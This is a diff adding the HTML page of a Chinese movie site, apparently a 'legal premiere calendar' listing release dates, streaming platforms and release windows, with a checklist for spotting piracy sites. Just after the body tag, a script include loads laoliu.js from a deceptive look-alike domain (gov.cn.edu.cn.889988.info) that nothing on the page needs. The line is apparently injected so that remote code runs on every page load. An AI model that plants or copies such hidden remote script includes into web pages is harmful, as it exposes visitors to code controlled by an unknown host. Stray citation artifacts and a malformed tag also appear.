@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>首播电影网 - 正版首播日历·流媒体上新导航·哪里先播</title>
+<meta name="description" content="首播电影网(shoubodianyingwang-h5.github.io)是正版首播日历站：电影/剧集/纪录片在爱优腾芒B站、1905、院线重映、公共领域的上线时间、平台与观看方式。不存片、不解析、不播盗版，只告诉你“哪天去哪看”。">
+<meta name="keywords" content="首播电影网, shoubodianyingwang-h5, 正版首播日历, 流媒体上新, 哪里先播, 电影上线时间, 院线重映">
+<meta name="author" content="首播电影网">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#0c0712;
+  --ink-2:#160d22;
+  --panel:rgba(255,255,255,.05);
+  --panel-2:rgba(255,255,255,.09);
+  --pink:#ff5fa2;
+  --violet:#9b6bff;
+  --cyan:#46e6ff;
+  --gold:#ffd166;
+  --silver:#e9e4f5;
+  --soft:#a99fc4;
+  --line:rgba(233,228,245,.16);
+  --radius:18px;
+  --shadow:0 10px 30px rgba(0,0,0,.4);
+}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;background:var(--ink);color:var(--silver);line-height:1.8;overflow-x:hidden}
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;background:
+  radial-gradient(520px 520px at 10% 8%,rgba(155,107,255,.26),transparent 60%),
+  radial-gradient(480px 480px at 90% 14%,rgba(255,95,162,.2),transparent 60%),
+  radial-gradient(600px 600px at 50% 120%,rgba(70,230,255,.14),transparent 60%),
+  linear-gradient(180deg,#0c0712,#160d22 60%,#0c0712);}
+.neon{position:fixed;width:3px;height:3px;border-radius:50%;background:#fff;z-index:0;opacity:.6;animation:blink 2.4s infinite alternate}
+@keyframes blink{from{opacity:.2}to{opacity:.9}}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(12,7,18,.82);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.15rem}
+.brand .dot{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,var(--pink),var(--violet));display:flex;align-items:center;justify-content:center;color:#0c0712;font-weight:900;box-shadow:0 0 18px rgba(255,95,162,.5)}
+.brand b{color:var(--pink)}
+.topnav{display:flex;gap:4px}
+.topnav a{padding:8px 14px;border-radius:8px;font-size:.84rem;font-weight:600;color:var(--soft);transition:.25s}
+.topnav a:hover,.topnav a.active{background:var(--panel-2);color:var(--pink)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--pink);cursor:pointer}
+
+.hero{position:relative;z-index:1;margin-top:60px;padding:78px 20px 56px}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+.kicker{font-family:"Courier New",monospace;font-size:.68rem;letter-spacing:3px;color:var(--pink);border:1px solid var(--line);padding:4px 10px;border-radius:20px}
+.hero h1{font-size:clamp(2rem,4.4vw,3.2rem);font-weight:900;line-height:1.15;margin:14px 0 8px}
+.hero h1 .glow{background:linear-gradient(90deg,var(--pink),var(--violet),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--soft);font-size:1rem;margin:14px 0 24px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;padding:12px 24px;border-radius:10px;cursor:pointer;border:none;transition:.3s}
+.btn-main{background:linear-gradient(135deg,var(--pink),var(--violet));color:#0c0712}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 14px 40px rgba(255,95,162,.35)}
+.btn-line{background:transparent;border:2px solid var(--pink);color:var(--pink)}
+.hero-card{background:var(--panel);border:1px solid var(--line);border-radius:20px;padding:24px;box-shadow:var(--shadow)}
+.hero-card h3{font-size:.95rem;margin-bottom:10px;color:var(--pink)}
+.hero-card p{font-size:.78rem;color:var(--soft);line-height:1.65}
+.hero-card .ok{color:var(--cyan);font-weight:800}
+
+.container{max-width:1200px;margin:0 auto;padding:52px 20px;position:relative;z-index:1}
+.label{font-family:"Courier New",monospace;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--pink)}
+.title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin:4px 0 6px}
+.desc{font-size:.88rem;color:var(--soft);margin-bottom:30px}
+
+/* 首播日历 */
+.cal-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.show{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:22px;transition:.3s;position:relative;overflow:hidden}
+.show::before{content:"";position:absolute;left:0;top:0;bottom:0;width:5px;background:var(--c,var(--pink))}
+.show:hover{transform:translateY(-4px);box-shadow:var(--shadow);border-color:var(--c,var(--pink))}
+.show .date{font-family:"Courier New",monospace;font-size:.78rem;color:var(--cyan);font-weight:700}
+.show h3{font-size:1rem;color:#fff;margin:6px 0 4px}
+.show p{font-size:.76rem;color:var(--soft);line-height:1.6}
+.show .plat{margin-top:10px;font-size:.72rem;font-weight:700;color:var(--c,var(--pink))}
+.tag-new{display:inline-block;font-size:.62rem;padding:2px 8px;border-radius:20px;background:rgba(255,95,162,.18);color:var(--pink);font-weight:700;margin-left:6px}
+
+/* 平台矩阵 */
+.plat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:18px}
+.plat-card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:20px}
+.plat-card h3{font-size:.95rem;color:#fff}
+.plat-card p{font-size:.74rem;color:var(--soft);margin-top:6px}
+.plat-card .mode{font-size:.7rem;color:var(--cyan);font-weight:700;margin-top:8px;display:inline-block}
+
+/* 窗口期 */
+.window{background:rgba(155,107,255,.07)}
+.win-row{display:grid;grid-template-columns:160px 1fr;gap:16px;padding:16px 20px;background:var(--panel);border:1px solid var(--line);border-radius:14px;margin-bottom:12px}
+.win-row .stage{font-weight:800;color:var(--violet)}
+.win-row p{font-size:.78rem;color:var(--soft)}
+
+/* 防坑 */
+.safe-box{background:var(--panel);border:1px dashed var(--pink);border-radius:var(--radius);padding:26px}
+.safe-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin-top:14px}
+.safe-item{display:flex;gap:10px;font-size:.8rem;color:var(--soft)}
+.safe-item .x{color:#ff6b6b;font-weight:800}
+.safe-item .v{color:var(--cyan);font-weight:800}
+
+.footer{position:relative;z-index:1;background:#08040d;color:var(--silver);padding:46px 20px 24px;margin-top:54px;border-top:1px solid var(--line)}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px}
+.footer h4{font-size:.9rem;margin-bottom:10px;color:#fff}
+.footer a{display:block;font-size:.8rem;color:var(--soft);padding:3px 0}
+.footer a:hover{color:var(--pink)}
+.footer p{font-size:.82rem;color:var(--soft);line-height:1.6}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(233,228,245,.5);padding-top:18px;border-top:1px solid rgba(233,228,245,.12)}
+.footer-bottom a{color:var(--pink);font-weight:600;display:inline}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr}.hero-card{order:-1}}
+@media(max-width:768px){
+  .topnav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:rgba(12,7,18,.97);padding:12px 20px;border-bottom:1px solid var(--line)}
+  .topnav.open{display:flex}.menu-btn{display:block}
+  .win-row{grid-template-columns:1fr}.footer-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr}.hero h1{font-size:1.7rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="bg"></div>
+<script>
+for(var i=0;i<60;i++){var s=document.createElement('div');s.className='neon';
+s.style.left=Math.random()*100+'vw';s.style.top=Math.random()*100+'vh';
+s.style.animationDelay=(Math.random()*2.4)+'s';document.body.appendChild(s);}
+</script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand"><span class="dot">首</span>首播<b>电影网</b></div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#cal">首播日历</a>
+      <a href="#plats">平台矩阵</a>
+      <a href="#window">发行窗口期</a>
+      <a href="#safe">防坑</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div>
+      <span class="kicker">PREMIERE CALENDAR · LEGAL STREAMING</span>
+      <h1>首播，不是盗版抢跑，<br>是<span class="glow">正版上线日历</span>。</h1>
+      <p>首播电影网（shoubodianyingwang-h5.github.io）只做一件事：哪部片哪天在哪家正版平台首播/上线/重映、免费还是会员、广告型还是公共领域。不托管视频、不解析第三方播放源、不仿登录。[10](@ref)</p>
+      <div class="hero-actions">
+        <button class="btn btn-main">📅 看首播日历</button>
+        <button class="btn btn-line">📺 查平台矩阵</button>
+      </div>
+    </div>
+    <div class="hero-card">
+      <h3>首播三不</h3>
+      <p><span class="ok">✓</span> 不存片、不盗链、不挂“专用播放器”<br>
+      <span class="ok">✓</span> 不上架院线/独播期未授权全集<br>
+      <span class="ok">✓</span> 日历信息按公开发行节奏整理<br>
+      <span class="ok">✓</span> “首播”=首发渠道导航，不是“秒更新盗版”</p>
+    </div>
+  </div>
+</section>
+
+<div class="container" id="cal">
+  <div class="label">— PREMIERE CALENDAR —</div>
+  <h2 class="title">首播日历：这周哪些片在正规平台先放</h2>
+  <p class="desc">时间为示意/公开发行节奏，具体以平台当期授权为准。</p>
+  <div class="cal-grid">
+    <div class="show" style="--c:var(--pink)"><div class="date">周一 · 会员首播</div><h3>国产悬疑新片<span class="tag-new">平台独播</span></h3><p>某正版平台拿到网络独播权，会员可看，非会员等窗口期或单片租借。</p><div class="plat">去：国内正版订阅平台</div></div>
+    <div class="show" style="--c:var(--cyan)"><div class="date">周三 · 广告免费</div><h3>公共领域默片修复版</h3><p>1920s 老片版权到期，档案馆放出 4K 修复版，广告型平台可合法免费看。</p><div class="plat">去：公共领域片库 / 广告型平台</div></div>
+    <div class="show" style="--c:var(--violet)"><div class="date">周五 · 院线→网络</div><h3>电影节获奖片上线</h3><p>先跑电影节、再小院线、再 OTT。影迷别去盗版站，等发行方公告最稳。</p><div class="plat">去：正版订阅 / 单片租借</div></div>
+    <div class="show" style="--c:var(--gold)"><div class="date">周六 · 家庭向</div><h3>动画合家欢重映</h3><p>老动画重映+正版平台同步上架，适合做“陪孩子看”片单。</p><div class="plat">去：国内正版免费区 / 订阅平台</div></div>
+    <div class="show" style="--c:var(--cyan)"><div class="date">周日 · 官方频道</div><h3>纪录片特别版</h3><p>片方官方频道放 50 分钟版，完整版进正版平台。别把“片段”当全集。</p><div class="plat">去：片方官方频道 / 正版平台</div></div>
+    <div class="show" style="--c:var(--pink)"><div class="date">每月 1 号 · 片单更新</div><h3>“本月首播精选”</h3><p>把各平台公开的新片/新剧/新纪录整成一张台历，降低跨 APP 找片成本。</p><div class="plat">去：首播电影网片单</div></div>
+  </div>
+</div>
+
+<div class="container" id="plats">
+  <div class="label">— PLATFORM MATRIX —</div>
+  <h2 class="title">平台矩阵：每家“首播”规则不一样</h2>
+  <p class="desc">找首播前，先懂平台模式。免费≠盗版，会员≠独占，广告型≠低质。</p>
+  <div class="plat-grid">
+    <div class="plat-card"><h3>爱优腾芒 B 站</h3><p>国产新片/剧集/动画主战场。免费区、会员、单片租借并存。</p><span class="mode">免费+会员+租片</span></div>
+    <div class="plat-card"><h3>1905 / 央视频</h3><p>官方正版经典片、主旋律、纪录片，大量可合法免费看。</p><span class="mode">官方免费</span></div>
+    <div class="plat-card"><h3>图书馆影视库</h3><p>读者证进 Kanopy/Hoopla 类资源，无广告、无盗版、学生家庭友好。</p><span class="mode">凭证免费</span></div>
+    <div class="plat-card"><h3>Tubi / Pluto TV</h3><p>海外广告型正版平台，老片/类型片多，片方授权、靠广告支撑。</p><span class="mode">广告换播放</span></div>
+    <div class="plat-card"><h3>公共领域档案</h3><p>Internet Archive / Prelinger：默片、新闻片、教育片合法自由看。</p><span class="mode">无版权障碍</span></div>
+    <div class="plat-card"><h3>院线 / 发行方</h3><p>首播前以制片方、发行方、院线公告为准；没公告就别信“秒上线”。</p><span class="mode">窗口期优先</span></div>
+  </div>
+</div>
+
+<div class="container window" id="window">
+  <div class="label">— RELEASE WINDOWS —</div>
+  <h2 class="title">发行窗口期：为什么“首播”不会同时在所有地方出现</h2>
+  <p class="desc">电影版权按时间、地区、平台拆开卖，这是正版世界的常识。</p>
+  <div class="win-row"><div class="stage">院线窗口</div><p>先电影院。这时候任何“免费全集”都高度可疑。[7](@ref)</p></div>
+  <div class="win-row"><div class="stage">发行方公告</div><p>片方/平台发“X月X日上线 X 平台”，这才是可信首播信号。</p></div>
+  <div class="win-row"><div class="stage">订阅/会员</div><p>进爱优腾芒、海外 OTT；老用户免费，新片可能另收租片费。</p></div>
+  <div class="win-row"><div class="stage">广告免费</div><p>几个月后转广告型平台/免费区，合法但片单会缩水。</p></div>
+  <div class="win-row"><div class="stage">公共领域</div><p>版权到期进入公共领域，档案馆/正版平台都能放，最稳。</p></div>
+</div>
+
+<div class="container" id="safe">
+  <div class="label">— DON'T GET TRICKED —</div>
+  <h2 class="title">“首播站”红灯清单</h2>
+  <p class="desc">名字带首播不可怕，行为像盗版才可怕。</p>
+  <div class="safe-box">
+    <div class="safe-grid">
+      <div class="safe-item"><span class="x">✕</span> 院线刚上就“高清全集免费”</div>
+      <div class="safe-item"><span class="x">✕</span> 点播放先下“解码器/专用APP”</div>
+      <div class="safe-item"><span class="x">✕</span> 独播剧全平台白嫖、无授权说明</div>
+      <div class="safe-item"><span class="x">✕</span 弹窗绕不完、假播放按钮满屏</div>
+      <div class="safe-item"><span class="x">✕</span> 要手机号/验证码“解锁首播”</div>
+      <div class="safe-item"><span class="x">✕</span> 域名天天换、主体永远匿名</div>
+      <div class="safe-item"><span class="v">✓</span> 写清“X月X日 X平台 会员/免费/租片”</div>
+      <div class="safe-item"><span class="v">✓</span> 片源指向官方/持证/公共领域</div>
+      <div class="safe-item"><span class="v">✓</span> 不装播放器、不收敏感信息</div>
+      <div class="safe-item"><span class="v">✓</span> 窗口期和发行方公告对得上</div>
+      <div class="safe-item"><span class="v">✓</span> 页脚有主体/隐私/侵权处理</div>
+      <div class="safe-item"><span class="v">✓</span> 敢写“本站不存储视听内容，仅导航”</div>
+    </div>
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div>
+        <div class="brand"><span class="dot">首</span>首播<b>电影网</b></div>
+        <p>首播电影网（shoubodianyingwang-h5.github.io）是正版首播日历站：电影/剧集/纪录片上线时间、平台模式、发行窗口期与防坑指南。不提供未授权播放，不聚合非法视听节目。[10](@ref)</p>
+      </div>
+      <div><h4>导航</h4><a href="#cal">首播日历</a><a href="#plats">平台矩阵</a><a href="#window">发行窗口期</a><a href="#safe">防坑清单</a></div>
+      <div><h4>片源类型</h4><a href="#">会员首播</a><a href="#">广告免费</a><a href="#">公共领域</a><a href="#">院线重映</a></div>
+      <div><h4>说明</h4><a href="#">本站立场</a><a href="#">版权与引用</a><a href="#">隐私说明</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 首播电影网 (Shoubo Movie Network) - 正版首播日历 · 流媒体上新导航 · 哪里先播</p>
+      <p>网站地址：<a href="https://shoubodianyingwang-h5.github.io">https://shoubodianyingwang-h5.github.io</a></p>
+      <p style="margin-top:6px;opacity:.6">上线时间/平台以各平台当期授权与发行方公告为准；公共领域影片以资源站版权说明为准。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')}});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+  var y=scrollY+80;
+  secs.forEach(function(s){
+    if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var l=document.querySelector('.topnav a[href="#'+s.id+'"]');
+      if(l)l.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
